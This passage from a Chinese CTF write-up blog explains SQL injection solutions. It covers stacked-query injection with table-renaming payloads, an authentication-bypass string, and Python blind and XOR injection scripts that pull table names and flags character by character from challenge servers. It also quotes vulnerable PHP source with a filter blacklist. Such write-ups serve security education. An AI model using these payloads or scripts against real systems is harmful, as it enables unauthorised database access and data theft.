class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mysqli_multi_query()  函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。有这个函数即可想到利用堆叠注入</p><p>sql_mode 是一组mysql支持的基本语法及校验规则</p><p><strong>mysql中sql_mode值举例：</strong> </p><p><strong>STRICT_TRANS_TABLES：</strong> </p><blockquote><p>mysql存储引擎的概念<br>innodb存储引擎（oltp系统）<br>myisam存储引擎（非实时交易）<br>对于innodb存储引擎来说当设置sql_mode有该值是，当发现插入数据无法正常插入，会报错，并且回滚所有参数（加入一个插入操作往数据表中插入10行数据，但是在第五行数据不能插入，此时会终止插入操作并且会回滚插入成功的数据）<br>对于myisam存储引擎：当插入数据是第一行无法插入时，报错并且回滚插入数据当插入的数据不是第一行无法插入时，此时mysql数据库会将无法插入的值转换为近似值或者发生隐式类型转换，并且不会报错 </p></blockquote><p><strong>STRICT_ALL_TABLES：</strong> </p><blockquote><p>对于innodb存储引擎作用一致<br>对于myisam存储引擎：当插入不是第一行报错时，会将报错之前的数据保留，终止之后的插入操作 </p></blockquote><p><strong>NO_ENGINE_SUBSTITUTION：</strong> </p><blockquote><p>当存储引擎被禁止或者未解析时，当使用时会报错 </p></blockquote><p><strong>only_for_group_by：</strong> </p><blockquote><p>当select字句中出现的单独列没有出现在group by字句中，此时就会报错 </p></blockquote><p><strong>NO_AUTO_CREATE_USER:</strong> </p><blockquote><p>禁止创建密码为空的用户 </p></blockquote><p><strong>NO_ZERO_IN_DATE：</strong> </p><blockquote><p>在严格模式下，不允许日期和月份为零 </p></blockquote><p><strong>NO_ZERO_DATE：</strong> </p><blockquote><p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告 </p></blockquote><p><strong>ERROR_FOR_DIVISION_BY_ZERO：</strong> </p><blockquote><p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL </p></blockquote><p><strong>NO_AUTO_CREATE_USER：</strong> </p><blockquote><p>禁止GRANT语句创建密码为空的用户 </p></blockquote><p><strong>PIPES_AS_CONCAT：</strong> </p><blockquote><p>将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似（本题要点） </p></blockquote><p><strong>ANSI_QUOTES：</strong> </p><blockquote><p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p></blockquote><p>于是有注入语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;SELECT 1</span><br></pre></td></tr></table></figure><p>拼合起来就是：</p><pre><code>select 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1||flag from Flag</code></pre><p>此时的select 1||flag from Flag就等同于select 1 from Flag和select flag from Flag的拼合</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/e6sQR1uwh3UA9v5.png" alt=""></p><p>另外还有一个解就是*的用法：</p><p>注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>拼合起来就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure><p>*为查询所有，此时的select *,1||flag from Flag就等同于select * from Flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xLgmrQAq4CXcp2G.png" alt=""></p><h3 id="2019强网杯—supersql"><a href="#2019强网杯—supersql" class="headerlink" title="2019强网杯—supersql"></a>2019强网杯—supersql</h3><p><strong>解题核心</strong>——————堆叠注入；详见大佬博客：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">SQL注入-堆叠注入</a></p><p>由题意，得知这应该是一个sql注入的题目，点进去界面如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Tdw4xkpqRJPmFQy.png" alt=""></p><p>刚开始用SQLMap测试了一下，发现好像没啥用，于是按开F12</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DBHQpKrU6AjybXo.png" alt=""></p><p>嗯，确实，一个工具有啥灵魂O.O</p><p>测试单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/5WiljO9kLTRwdqv.png" alt=""></p><p>接着测试注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;--+</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/lDUIhJOMKngXdsa.png" alt=""></p><p>被过滤掉了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;#</span><br></pre></td></tr></table></figure><p>#有效</p><p>尝试注入sql查询等语句，提示被过滤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/2AlOtopcrP7UjBs.png" alt=""></p><p>于是就用到前面提到了堆叠注入</p><p>首先列出所有数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show databases;#         显示如下</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/fMxuDnZJ8HYsOvV.png" style="zoom:50%;" /><p>列出所有表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#         显示如下</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/03/27/Sb8T1CNKvhA4snR.png" style="zoom:50%;" /><p>列出表words中的所有列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from words;#         显示如下</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/pFizfkZX6QTS9mR.png" style="zoom:50%;" /><p>列出表1919810931114514中所有的列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#         显示如下</span><br></pre></td></tr></table></figure><p><strong>注意：字符串为表名操作时要加反引号！！！</strong></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/kKmUczN6AZCnRwb.png" style="zoom:50%;" /><p>由展示的结果发现输入查询的结果是一个数字和一个字符串，是表words中的id和data结构，服务器是把inject的数值赋给id来查询表words中的数据</p><p>这题没有禁用rename和alter</p><p>可采用修改表结构的方法来得到flag，将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p><blockquote><p>rename用来修改表名</p><p>用法rename命令格式：rename table 原表名 to 新表名;</p></blockquote><blockquote><p>alter用来删除，添加或修改表字段</p><p>常用的语法格式如下：ALTER TABLE &lt;表名&gt; [修改选项]</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#</span><br></pre></td></tr></table></figure><p>上段注入语句的意思是将表words的名字修改为words1，把包含flag表1919810931114514的名字改成words，这样就可以通过服务器查询表1919810931114514中的内容了，但是flag表中含有少一个id列，于是可以在表中添加一个后者将flag列改为id，上面用到的是改flag列名字为id的方法,下面给出添加id列的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; add &#96;id&#96; varchar(100);#</span><br></pre></td></tr></table></figure><p>最终得到flag：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UoGTZ8HB9c7KlQ3.png" alt=""></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="2020ichunqiu新春公益赛—Ezsqli"><a href="#2020ichunqiu新春公益赛—Ezsqli" class="headerlink" title="2020ichunqiu新春公益赛—Ezsqli"></a>2020ichunqiu新春公益赛—Ezsqli</h3><p>出题思路<a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">Smi1e</a></p><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/tQegj4JmCsGbTXp.png" style="zoom:50%;" /><p>FUZZ测试后发现</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/7UIS3oMv6DWqsj8.png" style="zoom:80%;" /><p><code>in</code>被过滤<code>information_schema</code>、<code>mysql.innodb_table_stats</code>、<code>sys.schema_auto_increment_columns</code>都用不了了，这时就需要新的表来代替，<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/" target="_blank" rel="noopener">参考</a></p><p>Payload1：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))=&#39;f&#39;)</code></p><p>Payload2：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),1,1))=&#39;f&#39;)</code></p><p>于是写出盲注爆表脚本（Payload1）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://586656b32259484e8dbc25a81ee0a407820801130961430a.changame.ichunqiu.com/index.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">40</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span></span><br><span class="line">        d = <span class="string">"1^(ascii(substr((select group_concat(table_name,'') from sys.x$schema_flattened_keys),&#123;&#125;,1))=&#123;&#125;)"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>:d&#125;</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到两个列名，<code>f1ag_1s_h3r3_hhhhh</code>、<code>users233333333333333</code></p><p><code>flag</code>应该在<code>f1ag_1s_h3r3_hhhhh</code>中，这里需要用到一个技巧，就是将查询语句与相同数量的列进行比较，<a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">参考</a>，如图</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/sFLidjDgr5weSft.png" style="zoom: 80%;" /><p>而在mysql中，比较字符串大小是按位比较的，所以就可以用比较大小的方法一个一个的得到字段的内容</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/JIK9gluR1khN6zr.png" style="zoom:80%;" /><p>注：出题人这里还有一个坑，详见题目下方的链接</p><p>mysql默认是不区分大小写的区分大小写的注入，所以在爆字段的时候需要注意，但由于比赛flag都是小写，所以就直接盲注就可以了，但这里还是给出区分大小写的方法，<code>BINARY(&quot;A&quot;)</code>、<code>CAST(&quot;A&quot; AS JSON)</code>都会返回大写的A，当<code>in</code>被过滤了<code>BINARY</code>就不好使了，所以用第二个就OK</p><p>这里可以测试出有两个列，但是盲猜第一列的第一个是1可还行</p><p>Payload：<code>1^((select 1,concat(&#39;{}~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))</code></p><p>于是写出盲注爆字段脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://a9362c1023c04da19c143e01d7991148619db7d8fbff4e43.changame.ichunqiu.com/index.php"</span></span><br><span class="line">str = (<span class="string">"-"</span> + string.digits + string.ascii_letters + string.punctuation).replace(<span class="string">"'"</span>,<span class="string">""</span>).replace(<span class="string">'"'</span>,<span class="string">''</span>).replace(<span class="string">"\\"</span>,<span class="string">""</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span></span><br><span class="line">        d = <span class="string">"1^((select 1,concat('&#123;&#125;~',CAST('0' AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span>.format(flag+j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>:d&#125;</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(j,end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    flag = flag + j</span><br></pre></td></tr></table></figure><p>最终可以得到flag</p><h3 id="2020ichunqiu新春公益赛—简单的招聘系统"><a href="#2020ichunqiu新春公益赛—简单的招聘系统" class="headerlink" title="2020ichunqiu新春公益赛—简单的招聘系统"></a>2020ichunqiu新春公益赛—简单的招聘系统</h3><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/9WpDyf1SxXoMCrH.png" style="zoom:80%;" /><p>尝试使用弱密码，<code>1&#39; or 1=1#</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/tuM3g2DS8hEQ1WL.png" alt=""></p><p>于是可以在登录界面进行布尔盲注</p><p>爆库Payload：<code>2&#39; or (select (mid((select database()),{},1)))=&#39;{}&#39;#</code></p><p>爆表Payload：<code>2&#39; or (select (mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema=database()),{},1)))=&#39;{}&#39;#</code></p><p>爆列Payload：<code>2&#39; or (select (mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;flag&#39;),{},1)))=&#39;{}&#39;#</code></p><p>爆字段Payload：<code>2&#39; or (select (mid((select group_concat(flaaag,&#39;&#39;) from flag),{},1)))=&#39;{}&#39;#</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://b191000b2d4c4a77ad9c86f2d5476e7172ed2000f40b4c72.changame.ichunqiu.com/"</span></span><br><span class="line">str = (<span class="string">"-"</span> + string.digits + string.ascii_letters + string.punctuation).replace(<span class="string">"'"</span>,<span class="string">""</span>).replace(<span class="string">'"'</span>,<span class="string">''</span>).replace(<span class="string">"\\"</span>,<span class="string">""</span>)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span></span><br><span class="line">        d = <span class="string">"(This is Payload)"</span>.format(i,j)</span><br><span class="line">        <span class="comment">#print(d)</span></span><br><span class="line">        data = &#123;<span class="string">"lname"</span>:d , <span class="string">"lpass"</span>:<span class="string">'xxx'</span>&#125;</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        r.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'成功'</span> <span class="keyword">in</span> r.text.encode(<span class="string">'gbk'</span>).decode(r.apparent_encoding):</span><br><span class="line">            print(j,end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到数据库：<code>nzhaopin</code>,表：<code>backup,flag,user</code>，flag表的内容：<code>id,flaaag</code>，最终得到flag</p><h3 id="CISCN2019-Web1—Hack-World"><a href="#CISCN2019-Web1—Hack-World" class="headerlink" title="CISCN2019-Web1—Hack World"></a>CISCN2019-Web1—Hack World</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/t2nS8YpRmGTEsx7.png" alt=""></p><p>题目给出了flag在flag表和flag列中</p><p>测试后发现过滤了大多数字符，但有些还是没过滤的，于是进行sql盲注</p><p>空格利用<code>()</code>绕过，配合异或注入和判断回显信息一个一个爆出字符串</p><p>python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://13b50f67-3a54-481d-ae76-97f425fd8855.node3.buuoj.cn/"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;)"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>:d&#125;</span><br><span class="line">        r = requests.post(url,data = data)</span><br><span class="line">        print(r.status_code)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Error'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>网上这题的源码，可以参考参考</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbuser=<span class="string">'root'</span>;</span><br><span class="line">$dbpass=<span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    $blackList = <span class="keyword">array</span>(<span class="string">' '</span>,<span class="string">'||'</span>,<span class="string">'#'</span>,<span class="string">'-'</span>,<span class="string">';'</span>,<span class="string">'&amp;'</span>,<span class="string">'+'</span>,<span class="string">'or'</span>,<span class="string">'and'</span>,<span class="string">'`'</span>,<span class="string">'"'</span>,<span class="string">'insert'</span>,<span class="string">'group'</span>,<span class="string">'limit'</span>,<span class="string">'update'</span>,<span class="string">'delete'</span>,<span class="string">'*'</span>,<span class="string">'into'</span>,<span class="string">'union'</span>,<span class="string">'load_file'</span>,<span class="string">'outfile'</span>,<span class="string">'./'</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($blackList <span class="keyword">as</span> $blackitem)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stripos($sql,$blackitem))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$db = mysql_connect(<span class="string">"localhost"</span>,$dbuser,$dbpass);</span><br><span class="line"><span class="keyword">if</span>(!$db)&#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;   </span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>,$db);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(safe($id))&#123;</span><br><span class="line">    $query = mysql_query(<span class="string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($query)&#123;</span><br><span class="line">        $result = mysql_fetch_array($query);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($result)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $result[<span class="string">'content'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error Occured When Fetch Result."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        var_dump($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"SQL Injection Checked."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="极客大挑战—FinalSQL"><a href="#极客大挑战—FinalSQL" class="headerlink" title="极客大挑战—FinalSQL"></a>极客大挑战—FinalSQL</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-153.png" alt=""></p><p>在用户名和密码密码处尝试注入，发现绝大多数的字符都被过滤，于是找到另一个注入点（如下图），把注释删掉后在界面传参回车后观察URL的变化，传了一个id参数，故尝试在URL中的id处注入</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/MK1eADvmQB6dsRu.png" style="zoom: 80%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/image-155.png" style="zoom:33%;" /><p>后台过滤到限制字符的显示的界面（如下图）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/R4IgVByGQD1h6Pk.png" style="zoom:33%;" /><p>当注入上一题的查询数据库语句时，发现可以注入，显示以下界面，应该是后台把报错的界面给处理了，所以看不到数据库报错的界面</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/yjbmJD4Ocn76fCA.png" style="zoom:33%;" /><p>进行异或注入测试：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/cZS7VApdoaqNXOY.png" style="zoom:33%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/CHb6hqjxP7R8QuZ.png" style="zoom:33%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/D1vCu2slx3QiVIM.png" style="zoom:33%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/mKkaqdETW7U9I3Z.png" style="zoom:33%;" /><p>通过上面的测试发现，id=1^1的结果和id=0的结果是一样的，二当id=1^0的时候，界面就返回了当id=1的时候的界面，由此可以想到通过构造ASCII函数配合substr函数判断字符大小，当ASCII函数值等于（居然没过滤）后面的十进制时，显示id=0的时候的界面，具体脚本和判断方法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^(ascii(substr(("此处为sql语句"),变量i,1))=变量j)</span><br></pre></td></tr></table></figure><p>查库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek')),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/31rlIa5vfeoYkNF.png" alt=""></p><p>查表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn/search.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d = <span class="string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)='geek')),'"</span>+str(i)+<span class="string">"',1))='"</span>+str(j)+<span class="string">"')"</span></span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(chr(j),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/iOdeEnDWUwNK8V3.png" alt=""></p><p>查列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 